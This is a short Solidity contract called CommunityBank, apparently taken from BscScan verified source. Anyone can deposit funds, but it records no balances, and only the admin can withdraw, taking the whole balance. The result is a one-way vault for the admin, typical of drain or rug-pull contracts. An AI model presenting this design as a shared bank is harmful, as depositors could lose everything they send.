/**
 *Submitted for verification at BscScan.com on 2022-02-17
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-10
*/

pragma solidity ^0.4.24;

contract CommunityBank {
    
    address private admin = 0x90387e61035A74f4B011Bf9F3b69217ca577177C;

    constructor() public {
        admin = msg.sender;
    }

    function deposit() public payable {

    }

    function withdraw() public {
        require(msg.sender == admin, "Only admin");

        msg.sender.transfer(address(this).balance);
    }

    function setAdmin(address newAdmin) public {
        require(msg.sender == admin, "Only admin");

        admin = newAdmin;
    }
}